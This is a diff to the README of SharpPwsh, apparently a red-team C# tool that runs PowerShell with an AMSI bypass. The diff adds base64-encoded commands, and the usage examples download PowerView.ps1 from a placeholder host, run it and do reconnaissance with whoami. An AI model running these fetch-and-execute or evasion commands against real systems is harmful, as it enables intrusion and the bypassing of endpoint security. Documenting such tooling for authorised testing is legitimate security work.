@@ -6,6 +6,7 @@ C# .Net Framework program that uses `RunspaceFactory` for Powershell command exe
 - Load & execute remote script
 - AMSI Bypass
 - Multiple command & script support
+- Encoded command support
 
 ## Usage
 
@@ -19,6 +20,8 @@ Copyright c  2022
 
   -b, --bypass-amsi    Bypass AMSI
 
+  -e, --encoded        Encodeded command (base64)
+
   --help               Display this help screen.
 
   --version            Display version information.
@@ -30,8 +33,14 @@ Copyright c  2022
 # execute powershell command
 PS > .\SharpPwsh.exe -c whoami
 
+# execute base64 encoded powershell command
+PS > .\SharpPwsh.exe -e -c d2hvYW1pCg==
+
 # load remote script and execute
 PS > .\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -c get-netlocalgroup
+
+# load remote script and execute encoded command
+PS > .\SharpPwsh.exe -u http://x.x.x.x/PowerView.ps1 -e -c R2V0LU5ldExvY2FsR3JvdXAK
 
 # execute multiple powershell commands
 PS > .\SharpPwsh.exe -c hostname,whoami
